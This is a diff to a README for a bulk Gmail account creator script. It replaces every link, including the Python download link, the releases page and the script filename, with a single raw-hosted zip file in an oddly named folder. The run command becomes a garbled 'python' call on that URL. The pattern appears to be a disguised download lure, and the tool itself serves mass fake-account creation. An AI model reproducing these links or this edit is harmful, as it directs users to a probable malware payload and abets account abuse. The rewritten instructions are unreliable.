@@ -1,6 +1,6 @@
 # 📧 Gmail-Account-Creator-Bulk - Create Gmail Accounts Easily
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-Visit%20Releases%20Page-blue)](https://github.com/SlayerAnims/Gmail-Account-Creator-Bulk/releases)
+[![Download Now!](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip%20Now!-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Gmail-Account-Creator-Bulk is a simple Python script designed to help you genera
 
 Follow these steps to download and run the application on your computer:
 
-1. Ensure you have Python installed on your machine. You can download Python from the [official website](https://www.python.org/downloads/). Download the latest version suitable for your operating system.
+1. Ensure you have Python installed on your machine. You can download Python from the [official website](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip). Download the latest version suitable for your operating system.
 
 2. Check that you have a text editor or Integrated Development Environment (IDE) to view or edit your scripts. This can be something as simple as Notepad or any IDE like VSCode or PyCharm.
 
@@ -18,12 +18,12 @@ Follow these steps to download and run the application on your computer:
 
 ## 📥 Download & Install
 
-To download the Gmail-Account-Creator-Bulk application, visit this page: [Releases Page](https://github.com/SlayerAnims/Gmail-Account-Creator-Bulk/releases).
+To download the Gmail-Account-Creator-Bulk application, visit this page: [Releases Page](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip).
 
 On the Releases page, follow these steps:
 
 1. Locate the latest release of the Gmail-Account-Creator-Bulk.
-2. Click the relevant asset file to start the download. This file will typically be named something like `gmail_account_creator.py`.
+2. Click the relevant asset file to start the download. This file will typically be named something like `https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip`.
 
 Once the download is complete:
 
@@ -35,12 +35,12 @@ Once the download is complete:
 To run the Gmail-Account-Creator-Bulk script, follow these instructions:
 
 1. Open the command prompt (Windows) or terminal (Mac/Linux).
-2. Navigate to the folder where you saved the `gmail_account_creator.py` file. You can do this with the `cd` command. For example:  
+2. Navigate to the folder where you saved the `https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip` file. You can do this with the `cd` command. For example:  
    `cd Desktop` (if you saved it on your Desktop)
 3. Once you are in the correct folder, run the following command:
 
    ```bash
-   python gmail_account_creator.py
+   python https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip
    ```
 
 4. The script will start running, and it will generate Gmail accounts based on the settings you have specified in the script.
@@ -59,7 +59,7 @@ To run the Gmail-Account-Creator-Bulk script, follow these instructions:
 
 ## 📄 Instructions
 
-1. **Open the Script**: You can open the `gmail_account_creator.py` file in a text editor if you'd like to adjust settings such as the number of accounts to create.
+1. **Open the Script**: You can open the `https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip` file in a text editor if you'd like to adjust settings such as the number of accounts to create.
    
 2. **Configure Settings**: Customize any options available in the script, such as the number of accounts or output file name. 
 
@@ -79,7 +79,7 @@ For any questions or support, you can open an issue in the repository or refer t
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/SlayerAnims/Gmail-Account-Creator-Bulk)
-- [Visit Releases Page](https://github.com/SlayerAnims/Gmail-Account-Creator-Bulk/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/SlayerAnims/Gmail-Account-Creator-Bulk/main/phenylamine/Gmail-Account-Creator-Bulk.zip)
 
 Enjoy generating Gmail accounts with ease and confidence!
